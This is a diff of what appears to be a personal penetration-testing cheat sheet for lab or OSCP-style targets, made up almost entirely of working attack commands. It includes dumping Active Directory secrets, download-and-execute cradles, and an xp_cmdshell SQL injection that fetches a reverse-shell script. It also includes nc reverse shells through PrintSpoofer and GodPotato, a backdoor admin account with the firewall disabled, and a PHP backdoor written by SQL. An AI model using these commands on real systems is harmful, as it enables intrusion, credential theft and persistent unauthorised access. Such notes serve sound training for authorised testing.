@@ -3,7 +3,7 @@ Dump Secrets Such as SYSTEM and ntds.dit:
 ```bash
 impacket-secretsdump -ntds ntds.dit -system SYSTEM -sam SAM LOCAL
 ```
-
+192.168.49.140
 Discovery:
 
 ```bash
@@ -51,35 +51,35 @@ Transfer files.
 
 ```bash
 impacket-smbserver -smb2support newShare . -username test -password test
-net use z: \\192.168.45.238\newShare /u:test test
+net use z: \\192.168.49.140\newShare /u:test test
 copy z:\PowerUpSQL.ps1 .
 copy Database.kdbx z:\
 ```
-
+for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do ( icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%"  )&& echo.
 ```bash
 admin' UNION SELECT 1,2; EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.163:8000/rev.ps1") | powershell -noprofile';--+
 
-iex(iwr -uri 192.168.45.238:8000/transfer_files.ps1 -usebasicparsing)
+iex(iwr -uri 192.168.49.140:8000/transfer_files.ps1 -usebasicparsing)
 iex(iwr -uri 10.10.14.8:8000/transfer_files.ps1 -usebasicparsing)
 curl 10.10.14.8:8000/nc.exe -o nc.exe
 
-iex(iwr -uri 192.168.49.129:8000/transfer_files.ps1 -usebasicparsing)
-
-iwr -uri 192.168.45.238:8000/Certify.exe -usebasicparsing -outfile c:\windows\tasks\Certify.exe
+iex(iwr -uri 192.168.49.140:8000/nc.exe -usebasicparsing)
+transfer_files.ps1
+iwr -uri 192.168.45.178:8000/Certify.exe -usebasicparsing -outfile c:\windows\tasks\Certify.exe
 
 iex(iwr -uri 10.10.112.153:1234/transfer_files_ad.ps1 -usebasicparsing)
-certutil.exe -f -urlcache -split http://192.168.45.238:8000/svc_mssql443.exe svc_mssql443.exe
-wget http://192.168.45.238:8000/pspy64 -O /dev/shm/pspy;chmod +x /dev/shm/pspy;
+certutil.exe -f -urlcache -split http://192.168.45.178:8000/svc_mssql443.exe svc_mssql443.exe
+wget http://192.168.45.178:8000/pspy64 -O /dev/shm/pspy;chmod +x /dev/shm/pspy;
 certutil.exe -f -urlcache -split http://192.168.45.187:8000/
-
+192.168.49.140
 # Uploaded nc.exe from /usr/share/windows-resources/binaries/nc.exe
-.\PrintSpoofer64.exe -c ".\nc.exe -e cmd.exe 192.168.45.238 6969"
+.\PrintSpoofer64.exe -c ".\nc.exe -e cmd.exe 192.168.49.140 6969"
 
 .\PrintSpoofer64.exe -i -c C:\Windows\Tasks\binary.exe
 
 .\GodPotato-NET2.exe -cmd ".\nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.163 6969"
 
-Start-Process "$env:windir\system32\mstsc.exe" -ArgumentList "/v:dev04.medtech.com"
+Start-Process "$env:windir\system32\mstsc.exe" -ArgumentList "/v:ms01.oscp.exam"
 
 # Create Another Admin for RDP
 Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
@@ -87,7 +87,7 @@ netsh advfirewall set allprofiles state off
 net user /add backdoor Password123
 net localgroup administrators /add backdoor
 net localgroup "Remote Desktop Users" backdoor /add
-xfreerdp /v:192.168.174.221 /u:backdoor /p:Password123 /cert:ignore +clipboard
+xfreerdp /v:192.168.140.101 /u:backdoor /p:Password123 /cert:ignore +clipboard
 
 curl http://192.168.45.163:8000/linpeas.sh -o linpeas.sh;chmod +x linpeas.sh;
 curl http://192.168.45.163:8000/pspy64 -o pspy64;chmod +x pspy64;./pspy64
@@ -163,41 +163,42 @@ wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-words.txt --hc 4
 USERS:
 wfuzz -c -z file,/opt/SecLists/Usernames/top-usernames-shortlist.txt --hc 404,403 "$URL"
 
-
-================================================================================
+Proxying File/Dirbusting
+http 192.168.235.224 steve Password123!
+proxychains wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-small-files-lowercase.txt --hc 404 "http://127.0.0.1:8000/FUZZ"
 ===Command Injection with commix, ssl, waf, random agent.
 commix --url="https://supermegaleetultradomain.com?parameter=" --level=3 --force-ssl --skip-waf --random-agent
-================================================================================
+
 ===SQLMap
 sqlmap -u $URL --threads=2 --time-sec=10 --level=2 --risk=2 --technique=T --force-ssl
 sqlmap -u $URL --threads=2 --time-sec=10 --level=4 --risk=3 --dump
 /SecLists/Fuzzing/alphanum-case.txt
-================================================================================
+
 ===Social Recon
 theharvester -d domain.org -l 500 -b google
-================================================================================
+
 ===Nmap HTTP-methods
 nmap -p80,443 --script=http-methods  --script-args http-methods.url-path='/directory/goes/here'
-================================================================================
+
 ===SMTP USER ENUM
 smtp-user-enum -M VRFY -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $ip
 smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $ip
 smtp-user-enum -M RCPT -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $ip
 smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $ip
-================================================================================
+
 
 ===Command Execution Verification - [Ping check]
 tcpdump -i any -c5 icmp
-====
+
 #Check Network
 netdiscover /r 0.0.0.0/24
-====
+
 #INTO OUTFILE D00R
 SELECT “” into outfile “/var/www/WEROOT/backdoor.php”;
-====
+
 LFI?
 #PHP Filter Checks.
 php://filter/convert.base64-encode/resource=
-====
+
 UPLOAD IMAGE?
 GIF89a1
